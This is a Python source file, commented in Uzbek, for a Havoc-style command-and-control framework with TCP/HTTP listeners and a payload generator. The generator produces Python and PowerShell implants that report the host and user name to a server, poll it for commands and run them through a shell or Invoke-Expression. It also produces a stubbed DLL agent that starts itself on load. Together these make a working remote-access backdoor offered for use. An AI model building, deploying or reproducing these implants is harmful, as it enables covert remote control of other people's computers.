"""
Havoc-Style Listener Management System
HTTP, HTTPS, TCP listenerlarni boshqarish
Django integratsiyasi
"""

import threading
import socket
import ssl
from datetime import datetime
import json
import sys
import os

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.utils import *


class ListenerManager:
    """Listener boshqaruv tizimi"""
    
    def __init__(self):
        self.listeners = {}
        self.running_listeners = {}
        
    def create_http_listener(self, name, host='0.0.0.0', port=8080, ssl_enabled=False):
        """HTTP/HTTPS listener yaratish"""
        try:
            listener_config = {
                'name': name,
                'type': 'HTTP' if not ssl_enabled else 'HTTPS',
                'host': host,
                'port': port,
                'ssl_enabled': ssl_enabled,
                'status': 'stopped',
                'created_at': datetime.now().isoformat(),
                'connections': 0
            }
            
            self.listeners[name] = listener_config
            self.log(f"HTTP Listener yaratildi: {name} ({host}:{port})")
            
            return True
        except Exception as e:
            self.log(f"HTTP Listener yaratishda xato: {e}")
            return False
    
    def create_tcp_listener(self, name, host='0.0.0.0', port=9999):
        """TCP listener yaratish"""
        try:
            listener_config = {
                'name': name,
                'type': 'TCP',
                'host': host,
                'port': port,
                'status': 'stopped',
                'created_at': datetime.now().isoformat(),
                'connections': 0
            }
            
            self.listeners[name] = listener_config
            self.log(f"TCP Listener yaratildi: {name} ({host}:{port})")
            
            return True
        except Exception as e:
            self.log(f"TCP Listener yaratishda xato: {e}")
            return False
    
    def start_listener(self, name):
        """Listener ni ishga tushirish"""
        if name not in self.listeners:
            self.log(f"Listener topilmadi: {name}")
            return False
        
        config = self.listeners[name]
        
        try:
            if config['type'] in ['HTTP', 'HTTPS']:
                thread = threading.Thread(
                    target=self._run_http_listener,
                    args=(name, config),
                    daemon=True
                )
            elif config['type'] == 'TCP':
                thread = threading.Thread(
                    target=self._run_tcp_listener,
                    args=(name, config),
                    daemon=True
                )
            else:
                self.log(f"Noma'lum listener turi: {config['type']}")
                return False
            
            thread.start()
            self.running_listeners[name] = thread
            config['status'] = 'running'
            config['started_at'] = datetime.now().isoformat()
            
            self.log(f"Listener ishga tushdi: {name}")
            return True
            
        except Exception as e:
            self.log(f"Listener ishga tushirishda xato: {e}")
            return False
    
    def stop_listener(self, name):
        """Listener ni to'xtatish"""
        if name in self.listeners:
            self.listeners[name]['status'] = 'stopped'
            
        if name in self.running_listeners:
            # Thread ni to'xtatish
            del self.running_listeners[name]
            
        self.log(f"Listener to'xtatildi: {name}")
        return True
    
    def _run_http_listener(self, name, config):
        """HTTP listener Django orqali ishga tushadi"""
        try:
            # HTTP listener Django URLs va ViewSets orqali ishlaydi
            # c2_agents/urls.py ga qo'shilgan
            self.log(f"HTTP Listener Django serverda: {config['host']}:{config['port']}")
            config['status'] = 'running'
            
        except Exception as e:
            self.log(f"HTTP Listener xatosi [{name}]: {e}")
            config['status'] = 'error'
    
    def _run_tcp_listener(self, name, config):
        """TCP listener ishga tushirish"""
        server_socket = None
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((config['host'], config['port']))
            server_socket.listen(10)
            
            self.log(f"TCP Listener eshitilmoqda: {config['host']}:{config['port']}")
            
            while config['status'] == 'running':
                try:
                    client_socket, client_address = server_socket.accept()
                    config['connections'] += 1
                    
                    # Client bilan ishlash uchun alohida thread
                    client_thread = threading.Thread(
                        target=self._handle_tcp_client,
                        args=(name, client_socket, client_address),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.error as e:
                    if config['status'] == 'running':
                        self.log(f"TCP Socket xatosi [{name}]: {e}")
                        
        except Exception as e:
            self.log(f"TCP Listener xatosi [{name}]: {e}")
            config['status'] = 'error'
        finally:
            if server_socket:
                server_socket.close()
    
    def _handle_tcp_client(self, listener_name, client_socket, client_address):
        """TCP client bilan ishlash"""
        try:
            self.log(f"TCP Client ulandi [{listener_name}]: {client_address}")
            
            # Client data qabul qilish
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                
                # Echo back (demo)
                client_socket.send(b"ACK")
                
        except Exception as e:
            self.log(f"TCP Client xatosi: {e}")
        finally:
            client_socket.close()
            self.log(f"TCP Client uzilib qoldi: {client_address}")
    
    def get_listeners(self):
        """Barcha listenerlar ro'yxati"""
        return self.listeners
    
    def get_listener_stats(self, name):
        """Listener statistikalari"""
        if name not in self.listeners:
            return None
        
        config = self.listeners[name]
        return {
            'name': name,
            'type': config['type'],
            'status': config['status'],
            'connections': config['connections'],
            'uptime': self._calculate_uptime(config),
            'endpoint': f"{config['host']}:{config['port']}"
        }
    
    def _calculate_uptime(self, config):
        """Uptime hisoblaash"""
        if config['status'] != 'running' or 'started_at' not in config:
            return '00:00:00'
        
        try:
            started = datetime.fromisoformat(config['started_at'])
            uptime = datetime.now() - started
            
            hours = int(uptime.total_seconds() // 3600)
            minutes = int((uptime.total_seconds() % 3600) // 60)
            seconds = int(uptime.total_seconds() % 60)
            
            return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        except:
            return '00:00:00'
    
    def log(self, message):
        """Log xabar"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [LISTENER-MGR] {message}")


class PayloadGenerator:
    """Havoc-style payload generator"""
    
    def __init__(self):
        self.templates = {
            'windows_exe': self._get_windows_exe_template(),
            'powershell': self._get_powershell_template(),
            'python': self._get_python_template(),
            'dll': self._get_dll_template()
        }
    
    def generate_payload(self, payload_type, listener_config, output_path=None):
        """Payload yaratish"""
        try:
            if payload_type not in self.templates:
                raise ValueError(f"Payload turi qo'llab-quvvatlanmaydi: {payload_type}")
            
            template = self.templates[payload_type]
            
            # Template ni to'ldirish
            payload_code = template.format(
                host=listener_config['host'],
                port=listener_config['port'],
                protocol=listener_config['type'].lower()
            )
            
            # Faylga saqlash
            if output_path:
                with open(output_path, 'w') as f:
                    f.write(payload_code)
                self.log(f"Payload saqlandi: {output_path}")
            
            return payload_code
            
        except Exception as e:
            self.log(f"Payload yaratishda xato: {e}")
            return None
    
    def _get_windows_exe_template(self):
        """Windows EXE template"""
        return '''
import requests
import time
import json
import subprocess
import os
from datetime import datetime

class Agent:
    def __init__(self):
        self.server_url = "http://{host}:{port}"
        self.agent_id = self._generate_id()
        
    def _generate_id(self):
        import uuid
        return str(uuid.uuid4())
    
    def connect(self):
        while True:
            try:
                # Register
                data = {{"agent_id": self.agent_id, "hostname": os.getenv("COMPUTERNAME")}}
                response = requests.post(f"{{self.server_url}}/api/register", json=data)
                
                if response.status_code == 200:
                    self.heartbeat_loop()
                    
            except Exception as e:
                time.sleep(30)
    
    def heartbeat_loop(self):
        while True:
            try:
                response = requests.post(f"{{self.server_url}}/api/heartbeat", 
                                       json={{"agent_id": self.agent_id}})
                
                if response.status_code == 200:
                    data = response.json()
                    commands = data.get('commands', [])
                    
                    for cmd in commands:
                        self.execute_command(cmd)
                
                time.sleep(10)
                
            except:
                break
    
    def execute_command(self, command):
        try:
            if command.get('type') == 'exec':
                result = subprocess.run(command.get('data', ''), 
                                      shell=True, capture_output=True, text=True)
                # Send result back to server
                
        except Exception as e:
            pass

if __name__ == "__main__":
    agent = Agent()
    agent.connect()
        '''
    
    def _get_powershell_template(self):
        """PowerShell template"""
        return '''
$server = "http://{host}:{port}"
$agentId = [System.Guid]::NewGuid().ToString()

function Register-Agent {{
    $data = @{{
        agent_id = $agentId
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
    }} | ConvertTo-Json
    
    try {{
        Invoke-RestMethod -Uri "$server/api/register" -Method POST -Body $data -ContentType "application/json"
    }} catch {{
        Start-Sleep 30
        Register-Agent
    }}
}}

function Start-Heartbeat {{
    while ($true) {{
        try {{
            $data = @{{ agent_id = $agentId }} | ConvertTo-Json
            $response = Invoke-RestMethod -Uri "$server/api/heartbeat" -Method POST -Body $data -ContentType "application/json"
            
            foreach ($cmd in $response.commands) {{
                if ($cmd.type -eq "exec") {{
                    $result = Invoke-Expression $cmd.data
                    # Send result back
                }}
            }}
            
            Start-Sleep 10
        }} catch {{
            Start-Sleep 30
        }}
    }}
}}

Register-Agent
Start-Heartbeat
        '''
    
    def _get_python_template(self):
        """Python template"""
        return '''
#!/usr/bin/env python3
import requests
import time
import json
import subprocess
import os
import uuid
from datetime import datetime

SERVER_URL = "http://{host}:{port}"
AGENT_ID = str(uuid.uuid4())

def register():
    while True:
        try:
            data = {{
                "agent_id": AGENT_ID,
                "hostname": os.getenv("HOSTNAME") or os.getenv("COMPUTERNAME"),
                "username": os.getenv("USER") or os.getenv("USERNAME")
            }}
            
            response = requests.post(f"{{SERVER_URL}}/api/register", json=data, timeout=10)
            if response.status_code == 200:
                return True
        except:
            time.sleep(30)

def heartbeat():
    while True:
        try:
            data = {{"agent_id": AGENT_ID}}
            response = requests.post(f"{{SERVER_URL}}/api/heartbeat", json=data, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                commands = result.get('commands', [])
                
                for cmd in commands:
                    execute_command(cmd)
            
            time.sleep(10)
            
        except Exception as e:
            time.sleep(30)

def execute_command(command):
    try:
        if command.get('type') == 'exec':
            result = subprocess.run(
                command.get('data', ''),
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            # Process result here
            
    except Exception as e:
        pass

if __name__ == "__main__":
    if register():
        heartbeat()
        '''
    
    def _get_dll_template(self):
        """DLL template (C++ code)"""
        return '''
// Havoc C2 DLL Template - Educational Purpose Only
// Compile with: gcc -shared -o agent.dll agent.c -lws2_32 -lwininet

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#define SERVER_HOST "{host}"
#define SERVER_PORT {port}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{{
    switch (ul_reason_for_call)
    {{
    case DLL_PROCESS_ATTACH:
        // Initialize agent when DLL is loaded
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartAgent, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }}
    return TRUE;
}}

DWORD WINAPI StartAgent(LPVOID lpParam)
{{
    // Agent implementation here
    while (1)
    {{
        // Connect to C2 server
        // Send heartbeat
        // Execute commands
        Sleep(10000); // 10 seconds
    }}
    return 0;
}}

// Export functions
__declspec(dllexport) void StartC2Agent()
{{
    StartAgent(NULL);
}}
        '''
    
    def log(self, message):
        """Log xabar"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [PAYLOAD-GEN] {message}")


def main():
    """Test funksiya"""
    print("🎯 Havoc-Style Listener Manager")
    
    # Listener manager test
    manager = ListenerManager()
    
    # HTTP listener yaratish
    manager.create_http_listener("web-listener", "0.0.0.0", 8080)
    manager.create_http_listener("secure-listener", "0.0.0.0", 8443, ssl_enabled=True)
    
    # TCP listener yaratish
    manager.create_tcp_listener("raw-listener", "0.0.0.0", 9999)
    
    # Listenerlarni ko'rsatish
    print("\\n📋 Yaratilgan Listenerlar:")
    for name, config in manager.get_listeners().items():
        print(f"  {name}: {config['type']} - {config['host']}:{config['port']} [{config['status']}]")
    
    # Payload generator test
    print("\\n🚀 Payload Generator Test:")
    generator = PayloadGenerator()
    
    listener_config = {'host': '192.168.1.100', 'port': 8080, 'type': 'HTTP'}
    
    # Python payload
    python_payload = generator.generate_payload('python', listener_config)
    if python_payload:
        print("✅ Python payload yaratildi")
    
    # PowerShell payload
    ps_payload = generator.generate_payload('powershell', listener_config)
    if ps_payload:
        print("✅ PowerShell payload yaratildi")


if __name__ == "__main__":
    main()